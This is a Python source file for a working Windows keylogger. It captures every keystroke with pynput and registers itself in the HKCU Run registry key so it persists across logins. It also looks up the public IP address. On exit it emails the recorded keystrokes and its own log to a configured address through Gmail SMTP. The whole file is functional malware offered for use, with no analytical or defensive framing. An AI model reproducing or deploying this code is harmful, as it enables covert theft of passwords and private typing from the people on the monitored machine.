import logging
import smtplib
import socket
import urllib.request
import sys
import os
import os.path
from pynput.keyboard import Key, Listener
from datetime import datetime
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from win10toast import ToastNotifier
from winreg import *

LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO, format = LOG_FORMAT, filemode = "w")
logger = logging.getLogger()

EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
PORT = 465                                  # Specify port number (465 or 587 recommended)
SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
TO_ADDR = "user@domain.com"                 # Specify recipient email address
FROM_ADDR = "user@domain.com"               # Specify sender email address
PASSWORD = "your_password"                  # Specify sender email account password
HOSTNAME = socket.gethostname()
SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
try:
    PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    email_logs = True
    logger.info("Public ip address resolved")
except urllib.error.URLError:
    email_logs = False
    PUBLIC_IP = None
    logger.warning("https://ident.me could not be reached")
    
# Specify email body
CONTENT = '''
See keylogs.txt attached.

Sent from {}.'''.format(PUBLIC_IP)

active_keys = set()
# Record keystrokes in keylogs.txt
def log(text):
    with open("keylogs.txt", "a") as f:
        f.write(str(text))
        f.close()

# Add to system starup
def add_startup():
    # Get keylogger.py file path
    file_path = os.path.dirname(os.path.realpath(__file__))
    file_name = basename(sys.argv[0].split("\\")[-1])
    complete_file_path = file_path + "\\" + file_name
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    startup_key = OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS)
    added_to_startup = False
    
    # If keylogger.py entry exists, do not create entry again
    with startup_key as hkey:
        try:
            for i in range(1024):
                val = EnumValue(hkey, i)[0]
                if val == "keylogger.py":
                    logger.info("Script already added to Windows registry")
                    added_to_startup = True
                    break
        except OSError:
            pass
        # If If keylogger.py entry does not exist, create a new entry
        if added_to_startup == False:
            SetValueEx(startup_key, "keylogger.py", 0, REG_SZ, f"\"{complete_file_path}\"")
            logger.info("\"keylogger.py\" successfully added to Windows registry")

# Send email with keylogs.txt attached
def send_email():
    # Set messgae header and body
    msg = MIMEMultipart()
    msg["To"] = TO_ADDR
    msg["From"] = FROM_ADDR
    msg["Subject"] = SUBJECT
    body = MIMEText(CONTENT, "plain")
    msg.attach(body)
    logger.info("Email header and body constructed")
    
    # Attach keylogs.txt to email
    key_log = "keylogs.txt"
    with open(key_log, "r") as f:
        attachment1 = MIMEApplication(f.read(), Name = basename(key_log))
        attachment1["Content-Disposition"] = "attachment"; key_log = f"{basename(key_log)}"
    msg.attach(attachment1)
    logger.info("\"keylogs.txt\" attached to email")
    
    # Attach py-keylogger.log to email
    script_log = "py-keylogger.log"
    with open(script_log, "r") as f:
        attachment2 = MIMEApplication(f.read(), Name = basename(script_log))
        attachment2["Content-Disposition"] = "attachment"; script_log = f"{basename(script_log)}"
    msg.attach(attachment2)
    logger.info("\"py-keylogger.log\" attached to email")
    
    # Connect to SMTP server and send message
    server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
    server.login(FROM_ADDR, PASSWORD)
    logger.info(f"{FROM_ADDR} login successful")
    server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
    logger.info(f"Files sent from {FROM_ADDR} to {TO_ADDR}\n")
    server.quit()

# Detect keystrokes
def on_press(key):
    if key in EXIT_COMBINATION:
        active_keys.add(key)
        if all(k in active_keys for k in EXIT_COMBINATION):
            listener.stop()
            logger.info("[KEYLOGGER STOP]")

    try:
        log(key.char)
    except AttributeError:
        if key == Key.backspace:
            log("\n[BACKSPACE]\n")
        elif key == Key.tab:
            log("\n[TAB]\n")
        elif key == Key.enter:
            log("\n[ENTER]\n")
        elif key == Key.shift:
            pass
        elif key == Key.space:
            log(" ")
        else:
            log("\n" + str(key) + "\n")


def on_release(key):
    pass



logger.info("PKEYLOGGER START]")
add_startup()

# Clear previous log only if it has aready been sent via email
if email_logs:
    with open("keylogs.txt", "w") as f:
        f.close()

# Log start time and date
start_date = datetime.now()
start_minute = str(start_date.minute)
if len(start_minute) == 1:
    start_minute = "0" + start_minute

log("-----------------------------\n")
log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
log("-----------------------------\n")

logger.info("Recording keystrokes...")
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

# Log end time and date
end_date = datetime.now()
end_minute = str(end_date.minute)
if len(end_minute) == 1:
    end_minute = "0" + end_minute

log("-----------------------------\n")
log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
log("-----------------------------\n")

'''Windows 10 notification when keylogger is stopped.'''
# ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)

# Send email once log is closed
if email_logs:
    send_email()
